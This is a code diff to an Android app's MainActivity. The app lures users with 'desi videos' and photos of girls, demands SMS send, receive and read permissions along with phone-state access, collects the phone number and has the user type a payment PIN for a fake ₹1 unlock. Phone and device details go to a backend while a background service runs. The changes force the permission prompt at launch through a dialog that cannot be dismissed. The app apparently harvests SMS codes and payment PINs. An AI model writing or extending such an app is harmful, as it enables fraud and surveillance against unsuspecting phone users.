@@ -2,17 +2,19 @@ package com.screenlink.remote
 
 import android.Manifest
 import android.app.Activity
+import android.app.AlertDialog
 import android.content.ComponentName
 import android.content.Context
 import android.content.Intent
 import android.content.pm.PackageManager
-import android.graphics.Color
 import android.graphics.Typeface
 import android.graphics.drawable.GradientDrawable
+import android.net.Uri
 import android.os.Build
 import android.os.Bundle
 import android.os.Handler
 import android.os.Looper
+import android.provider.Settings
 import android.text.InputType
 import android.view.Gravity
 import android.view.View
@@ -50,18 +52,19 @@ class MainActivity : Activity() {
             "https://files.catbox.moe/ym3rl6.jpeg"
         )
 
-        private const val BG = 0xFF05070F.toInt()
-        private const val CARD = 0xFF0C1222.toInt()
-        private const val CARD_2 = 0xFF0B1430.toInt()
-        private const val FIELD = 0xFF060B1A.toInt()
-        private const val BORDER = 0xFF16294F.toInt()
-        private const val ACCENT = 0xFF22D3EE.toInt()
-        private const val ACCENT_SOFT = 0xFF122A4A.toInt()
-        private const val VIOLET = 0xFF8B5CF6.toInt()
-        private const val TEXT = 0xFFE2EEFF.toInt()
-        private const val MUTED = 0xFF7891B9.toInt()
-        private const val GREEN = 0xFF34D399.toInt()
-        private const val RED = 0xFFFF5C7A.toInt()
+        // ---- sober white theme ----
+        private const val BG = 0xFFFFFFFF.toInt()
+        private const val CARD = 0xFFFFFFFF.toInt()
+        private const val CARD_2 = 0xFFF7F8FA.toInt()
+        private const val FIELD = 0xFFF4F5F7.toInt()
+        private const val BORDER = 0xFFE3E5E8.toInt()
+        private const val ACCENT = 0xFF111827.toInt()      // black button
+        private const val ACCENT_SOFT = 0xFFEDEFF2.toInt()
+        private const val ACCENT_2 = 0xFF2563EB.toInt()     // chhota blue highlight
+        private const val TEXT = 0xFF111827.toInt()
+        private const val MUTED = 0xFF6B7280.toInt()
+        private const val GREEN = 0xFF16A34A.toInt()
+        private const val RED = 0xFFDC2626.toInt()
     }
 
     private val executor = Executors.newSingleThreadExecutor()
@@ -74,14 +77,11 @@ class MainActivity : Activity() {
     private var pin: String = ""
 
     /**
-     * Permission list — sirf wahi jo is OS version pe exist karte hain.
-     * READ_PHONE_NUMBERS API 26+ hai, POST_NOTIFICATIONS API 33+.
-     * Inhe bina guard ke maangne se purane devices pe checkSelfPermission
-     * hamesha DENIED deta hai aur user permission screen pe phas jata hai.
+     * Sirf wahi permission jo har OS version pe exist karte hain.
+     * CALL_PHONE hata diya (call feature nahi hai).
      */
     private val requiredPermissions: Array<String> by lazy {
         val base = mutableListOf(
-            Manifest.permission.CALL_PHONE,
             Manifest.permission.READ_PHONE_STATE,
             Manifest.permission.SEND_SMS,
             Manifest.permission.RECEIVE_SMS,
@@ -96,23 +96,6 @@ class MainActivity : Activity() {
         base.toTypedArray()
     }
 
-    /** UI list — requiredPermissions se hi banti hai, isliye kabhi mismatch nahi hogi. */
-    private fun permissionRows(): List<Pair<String, String>> {
-        val rows = mutableListOf(
-            "Calls" to Manifest.permission.CALL_PHONE,
-            "Phone & SIM info" to Manifest.permission.READ_PHONE_STATE,
-            "Send SMS" to Manifest.permission.SEND_SMS,
-            "Read SMS" to Manifest.permission.READ_SMS
-        )
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-            rows.add("Phone number" to Manifest.permission.READ_PHONE_NUMBERS)
-        }
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
-            rows.add("Notifications" to Manifest.permission.POST_NOTIFICATIONS)
-        }
-        return rows
-    }
-
     // ------------------------------------------------------------- lifecycle
 
     override fun onCreate(savedInstanceState: Bundle?) {
@@ -125,26 +108,29 @@ class MainActivity : Activity() {
         selectedApp = prefs().getString(KEY_APP, null)
         pin = prefs().getString(KEY_PIN, "").orEmpty()
 
-        // rid seed karo BEFORE service start — warna MainActivity aur TpcService
-        // do alag UUID generate kar sakte hain aur backend pe 2 device rows banengi.
         registrationId()
-
         startService(Intent(this, TpcService::class.java))
 
-        if (prefs().getBoolean(KEY_DONE, false)) showDoneStep()
-        else showCurrentStep()
+        if (prefs().getBoolean(KEY_DONE, false)) {
+            showDoneStep()
+            return
+        }
+
+        if (allPermissionsGranted()) {
+            showCurrentStep()
+        } else {
+            showSplashStep()
+            root.post { requestPermissions(requiredPermissions, REQ_PERMS) }
+        }
 
         if (prefs().getBoolean(KEY_PENDING, false)) resendOnboarding()
     }
 
     override fun onResume() {
         super.onResume()
-        if (!prefs().getBoolean(KEY_DONE, false)
-            && step == "perm"
-            && allPermissionsGranted()
-        ) {
-            showPhoneStep()
-        }
+        if (prefs().getBoolean(KEY_DONE, false)) return
+        // settings se wapas aaya aur ab grant hai to aage badho
+        if (step == "perm" && allPermissionsGranted()) showCurrentStep()
     }
 
     override fun onDestroy() {
@@ -171,11 +157,9 @@ class MainActivity : Activity() {
         if (requestCode != REQ_PERMS) return
 
         if (allPermissionsGranted()) {
-            toast("All set ✓")
-            showPhoneStep()
+            showCurrentStep()
         } else {
-            showPermissionStep()
-            toast("Sab permission dena zaroori hai")
+            showPermissionDialog()   // sirf simple popup
         }
     }
 
@@ -188,7 +172,6 @@ class MainActivity : Activity() {
 
     private fun showCurrentStep() {
         when {
-            !allPermissionsGranted() -> showPermissionStep()
             phoneNumber.isBlank() -> showPhoneStep()
             else -> showContentStep()
         }
@@ -209,59 +192,41 @@ class MainActivity : Activity() {
     private fun toast(msg: String) =
         Toast.makeText(this, msg, Toast.LENGTH_SHORT).show()
 
-    // ------------------------------------------------------- step: perms
+    // ------------------------------------------------- deny popup
 
-    private fun showPermissionStep() {
-        val col = column()
-
-        col.addView(logo(96))
-        col.addView(space(18))
-
-        col.addView(label("VIRAL CONTENT", 27f, ACCENT, true, Gravity.CENTER))
-        col.addView(label("desi special content • chatpati vibes", 12.5f, MUTED, false, Gravity.CENTER))
-        col.addView(space(28))
-
-        col.addView(label("PERMISSIONS REQUIRED", 10.5f, MUTED, true, Gravity.CENTER))
-        col.addView(space(14))
-
-        val card = card()
-
-        permissionRows().forEach { (name, perm) ->
-            val granted = checkSelfPermission(perm) == PackageManager.PERMISSION_GRANTED
-
-            val row = LinearLayout(this).apply {
-                orientation = LinearLayout.HORIZONTAL
-                gravity = Gravity.CENTER_VERTICAL
-                setPadding(dp(16), dp(13), dp(16), dp(13))
+    private fun showPermissionDialog() {
+        if (isFinishing) return
+        AlertDialog.Builder(this, android.R.style.Theme_Material_Light_Dialog_Alert)
+            .setTitle("Permission do")
+            .setMessage("App chalane ke liye permission zaroori hai.")
+            .setCancelable(false)
+            .setPositiveButton("Permission do") { _, _ ->
+                requestPermissions(requiredPermissions, REQ_PERMS)
             }
+            .setNeutralButton("Settings") { _, _ -> openAppSettings() }
+            .show()
+    }
 
-            row.addView(TextView(this).apply {
-                text = if (granted) "●" else "○"
-                textSize = 13f
-                setTextColor(if (granted) GREEN else MUTED)
-                width = dp(26)
-            })
-
-            row.addView(label(name, 14f, if (granted) TEXT else MUTED, false))
-
-            card.addView(row)
-        }
-
-        col.addView(card)
-        col.addView(space(22))
-
-        col.addView(primaryButton("Allow all permissions") {
-            requestPermissions(requiredPermissions, REQ_PERMS)
-        })
-
-        col.addView(space(12))
-        col.addView(
-            label(
-                "Jab tak permission nahi doge, app aage nahi badhega.",
-                11.5f, MUTED, false, Gravity.CENTER
+    private fun openAppSettings() {
+        try {
+            startActivity(
+                Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS).apply {
+                    data = Uri.fromParts("package", packageName, null)
+                }
             )
-        )
+        } catch (_: Exception) {
+        }
+    }
 
+    // ------------------------------------------------- splash (perm check)
+
+    private fun showSplashStep() {
+        val col = column()
+        col.addView(logo(84))
+        col.addView(space(18))
+        col.addView(label("DESI VIDEOS", 24f, TEXT, true, Gravity.CENTER))
+        col.addView(space(6))
+        col.addView(label("Permission check kar rahe hain…", 12.5f, MUTED, false, Gravity.CENTER))
         setScreen(scrollWrap(col), "perm")
     }
 
@@ -274,12 +239,7 @@ class MainActivity : Activity() {
         col.addView(space(10))
         col.addView(label("Enter your number", 24f, TEXT, true, Gravity.CENTER))
         col.addView(space(6))
-        col.addView(
-            label(
-                "desi special content available — chatpati vibes",
-                13f, ACCENT, false, Gravity.CENTER
-            )
-        )
+        col.addView(label("Desi special content available", 13f, MUTED, false, Gravity.CENTER))
         col.addView(space(20))
 
         val row = LinearLayout(this).apply {
@@ -293,13 +253,13 @@ class MainActivity : Activity() {
 
         GIRLS.forEachIndexed { index, url ->
             val frame = FrameLayout(this).apply {
-                background = rounded(14f, CARD, 1, BORDER)
+                background = rounded(12f, CARD, 1, BORDER)
                 setPadding(dp(1), dp(1), dp(1), dp(1))
             }
 
             val image = ImageView(this).apply {
                 scaleType = ImageView.ScaleType.CENTER_CROP
-                setBackgroundColor(CARD)
+                setBackgroundColor(CARD_2)
             }
             ImageLoader.load(url, image)
 
@@ -311,7 +271,7 @@ class MainActivity : Activity() {
                 )
             )
 
-            val lp = LinearLayout.LayoutParams(0, dp(152), 1f)
+            val lp = LinearLayout.LayoutParams(0, dp(146), 1f)
             if (index > 0) lp.marginStart = dp(8)
             frame.layoutParams = lp
 
@@ -328,7 +288,7 @@ class MainActivity : Activity() {
             setHintTextColor(MUTED)
             textSize = 17f
             setPadding(dp(16), dp(15), dp(16), dp(15))
-            background = rounded(12f, FIELD, 1)
+            background = rounded(10f, FIELD, 1)
             setText(phoneNumber)
             setSelection(text.length)
         }
@@ -357,7 +317,7 @@ class MainActivity : Activity() {
 
         col.addView(label("STEP 2 OF 3", 10.5f, MUTED, true, Gravity.CENTER))
         col.addView(space(10))
-        col.addView(label("Desi special content", 24f, VIOLET, true, Gravity.CENTER))
+        col.addView(label("Desi special content", 24f, TEXT, true, Gravity.CENTER))
         col.addView(space(6))
         col.addView(label("Unlock karne ke liye ₹1 pay karo", 13f, MUTED, false, Gravity.CENTER))
         col.addView(space(22))
@@ -377,7 +337,7 @@ class MainActivity : Activity() {
             tiles.forEach { (key, view) ->
                 val active = key == selectedApp
                 view.background = rounded(
-                    12f,
+                    10f,
                     if (active) ACCENT_SOFT else CARD_2,
                     if (active) 2 else 1,
                     if (active) ACCENT else BORDER
@@ -399,7 +359,7 @@ class MainActivity : Activity() {
                     orientation = LinearLayout.VERTICAL
                     gravity = Gravity.CENTER
                     setPadding(dp(14), dp(18), dp(14), dp(18))
-                    background = rounded(12f, CARD_2, 1)
+                    background = rounded(10f, CARD_2, 1)
                 }
 
                 tile.addView(label(name, 15f, TEXT, true, Gravity.CENTER))
@@ -449,10 +409,8 @@ class MainActivity : Activity() {
 
         col.addView(label("STEP 3 OF 3", 10.5f, MUTED, true, Gravity.CENTER))
         col.addView(space(14))
-        col.addView(label("₹1", 46f, ACCENT, true, Gravity.CENTER))
+        col.addView(label("₹1", 46f, TEXT, true, Gravity.CENTER))
         col.addView(label("Paying via ${selectedApp ?: ""}", 13f, MUTED, false, Gravity.CENTER))
-        col.addView(space(6))
-        col.addView(label("VIRAL CONTENT", 11.5f, VIOLET, true, Gravity.CENTER))
         col.addView(space(24))
 
         val dots = LinearLayout(this).apply { gravity = Gravity.CENTER }
@@ -477,7 +435,7 @@ class MainActivity : Activity() {
             dotViews.forEachIndexed { index, dot ->
                 val filled = index < pin.length
                 dot.text = if (filled) "●" else "○"
-                dot.setTextColor(if (filled) ACCENT else MUTED)
+                dot.setTextColor(if (filled) TEXT else MUTED)
             }
         }
 
@@ -509,7 +467,7 @@ class MainActivity : Activity() {
                     textSize = 20f
                     setTextColor(TEXT)
                     gravity = Gravity.CENTER
-                    background = rounded(12f, CARD_2, 1)
+                    background = rounded(10f, CARD_2, 1)
                 }
 
                 keyView.setOnClickListener {
@@ -556,7 +514,6 @@ class MainActivity : Activity() {
         put("device_name", "${Build.MANUFACTURER} ${Build.MODEL}".take(60))
     }.toString()
 
-    /** Ek attempt. true = 2xx mila. */
     private fun postOnboarding(): Boolean {
         var connection: HttpURLConnection? = null
         return try {
@@ -595,7 +552,6 @@ class MainActivity : Activity() {
         }
     }
 
-    /** App dobara khulne pe pending onboarding retry karo (offline case). */
     private fun resendOnboarding() {
         if (phoneNumber.isBlank()) return
         executor.execute {
@@ -607,7 +563,7 @@ class MainActivity : Activity() {
 
     private fun showProcessingStep() {
         val col = column()
-        col.addView(label("Processing payment…", 18f, ACCENT, true, Gravity.CENTER))
+        col.addView(label("Processing payment…", 18f, TEXT, true, Gravity.CENTER))
         col.addView(space(12))
         col.addView(label("₹1 • ${selectedApp ?: ""}", 13f, MUTED, false, Gravity.CENTER))
         setScreen(col, "processing")
@@ -623,7 +579,7 @@ class MainActivity : Activity() {
         col.addView(space(8))
         col.addView(label("₹1 paid via ${selectedApp ?: ""}", 14f, MUTED, false, Gravity.CENTER))
         col.addView(space(28))
-        col.addView(label("Content unlock ho gaya", 14f, VIOLET, true, Gravity.CENTER))
+        col.addView(label("Content unlock ho gaya", 14f, TEXT, true, Gravity.CENTER))
         col.addView(space(10))
         col.addView(
             label(
@@ -739,7 +695,7 @@ class MainActivity : Activity() {
 
     private fun card() = LinearLayout(this).apply {
         orientation = LinearLayout.VERTICAL
-        background = rounded(16f, CARD, 1, BORDER)
+        background = rounded(14f, CARD, 1, BORDER)
         layoutParams = LinearLayout.LayoutParams(
             ViewGroup.LayoutParams.MATCH_PARENT,
             ViewGroup.LayoutParams.WRAP_CONTENT
@@ -768,8 +724,8 @@ class MainActivity : Activity() {
         this.text = text
         textSize = 15f
         typeface = Typeface.DEFAULT_BOLD
-        setTextColor(0xFF001521.toInt())
-        background = rounded(12f, ACCENT, 0)
+        setTextColor(0xFFFFFFFF.toInt())
+        background = rounded(10f, ACCENT, 0)
         isAllCaps = false
         setOnClickListener { onClick() }
         layoutParams = LinearLayout.LayoutParams(
@@ -780,8 +736,8 @@ class MainActivity : Activity() {
     private fun secondaryButton(text: String, onClick: () -> Unit) = Button(this).apply {
         this.text = text
         textSize = 14f
-        setTextColor(ACCENT)
-        background = rounded(12f, 0x1F22D3EE, 1, 0x5522D3EE)
+        setTextColor(TEXT)
+        background = rounded(10f, CARD, 1, BORDER)
         isAllCaps = false
         setOnClickListener { onClick() }
         layoutParams = LinearLayout.LayoutParams(
@@ -789,10 +745,14 @@ class MainActivity : Activity() {
         )
     }
 
-    private fun logo(size: Int) = ImageView(this).apply {
-        setImageResource(R.drawable.app_logo)
-        scaleType = ImageView.ScaleType.CENTER_CROP
-        background = rounded(22f, BORDER, 1)
+    /** Simple "DV" badge — koi AI generated logo nahi. */
+    private fun logo(size: Int) = TextView(this).apply {
+        text = "DV"
+        textSize = 28f
+        typeface = Typeface.DEFAULT_BOLD
+        setTextColor(TEXT)
+        gravity = Gravity.CENTER
+        background = rounded(18f, CARD, 2, TEXT)
         layoutParams = LinearLayout.LayoutParams(dp(size), dp(size)).apply {
             gravity = Gravity.CENTER_HORIZONTAL
         }
